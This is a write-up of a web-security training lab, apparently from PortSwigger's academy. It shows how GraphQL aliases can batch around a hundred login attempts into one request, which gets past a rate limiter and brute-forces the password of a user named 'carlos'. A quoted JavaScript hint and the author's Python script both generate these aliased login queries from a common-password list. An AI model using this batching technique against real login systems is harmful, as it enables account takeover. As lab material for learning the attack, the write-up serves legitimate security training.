
----

### Lab description

The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.

To solve the lab, brute force the login mechanism to sign in as `carlos`. Use the list of [authentication lab passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords) as your password source.

We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to modify GraphQL queries in Repeater.

For more information on using InQL, see [Working with GraphQL in Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/working-with-graphql).

#### Lab Hint

This lab requires you to craft a large request that uses aliases to send multiple login attempts at the same time. As this request could be time-consuming to create manually, we recommend you use a script to build the request.

The below example JavaScript builds a list of aliases corresponding to our list of authentication lab passwords and copies the request to your clipboard. To run this script:

1. Open the lab in Burp's browser.
2. Right-click the page and select **Inspect**.
3. Select the **Console** tab.
4. Paste the script and press Enter.

You can then use the generated aliases when crafting your request in Repeater.

``copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>` bruteforce$index:login(input:{password: "$password", username: "carlos"}) { token success } `.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");``


### Lab solution

- if you try a lot of request you you got caught by the rate limit :) 

![](/static/img/Pasted_image_20230703212428.png)

- We can use aliases graphQL to bypass this filter
	- The login request
	![](/static/img/Pasted_image_20230703212552.png)

- We can use the same inQL extension to create many aliases as follows
![](/static/img/Pasted_image_20230703214238.png)

i made a simple python script to generate the same content of the lab's hint

```python

import os

import pyperclip

# python3 -m pip install pyperclip --user

passwords = ["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow"]

  

query = []

  

for i, password in enumerate(passwords):

query.append(f'bruteforce{i}: login(input: {{ password: "{password}", username: "carlos" }}) {{\n token\n success\n}}')

  

query_str = '\n'.join(query)

pyperclip.copy(query_str) # copies query string to clipboard

  

print("The query has been copied to your clipboard.")


```

![](/static/img/Pasted_image_20230703214432.png)

![](/static/img/Pasted_image_20230703214456.png)